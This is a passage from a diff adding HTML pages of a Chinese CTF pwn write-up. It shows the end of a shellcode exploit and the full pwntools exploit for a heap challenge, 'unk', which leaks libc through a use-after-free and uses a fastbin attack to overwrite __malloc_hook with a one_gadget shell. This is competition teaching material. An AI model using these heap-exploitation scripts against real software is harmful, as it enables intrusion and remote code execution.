+</span></span></span><span class="line"><span class="cl"><span class="s1">//调用read()
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 3
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0xff
+</span></span></span><span class="line"><span class="cl"><span class="s1">xor rax,rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">//调用write()
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0xff
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rwx_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="unk">unk
+</h2><h3 id="题目分析-5">题目分析：
+</h3><p>打开后发现是堆题，题目同时存在UAF和堆溢出，没有额外限制（所以就不贴图了），同时远程libc版本为2.232.23-0ubuntu11.3_amd64，本题解题方法较多:</p>
+<p>我这边采用UAF漏洞，通过unsortedbin chunk 泄露libc地址，然后通过fastbin attack改写__malloc_hook为one_gadget</p>
+<h3 id="exp-5">exp：
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(filename)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;120.46.59.242&#34;</span><span class="p">,</span><span class="mi">2108</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.23-0ubuntu11.3_amd64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#gdb.attach(io,&#34;b *$rebase(0xc99)&#34;)</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#gdb.attach(io)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x4009fe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;index:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;size:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;index:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">length</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;index:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;length:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;content:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;index:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3C4B78</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;libc_base:&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;malloc_hook:&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#debug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xf1247</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x4527a execve(&#34;/bin/sh&#34;, rsp+0x30, environ)
+</span></span></span><span class="line"><span class="cl"><span class="s1">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s1">  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">0xf03a4 execve(&#34;/bin/sh&#34;, rsp+0x50, environ)
+</span></span></span><span class="line"><span class="cl"><span class="s1">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s1">  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">0xf1247 execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
+</span></span></span><span class="line"><span class="cl"><span class="s1">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s1">  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
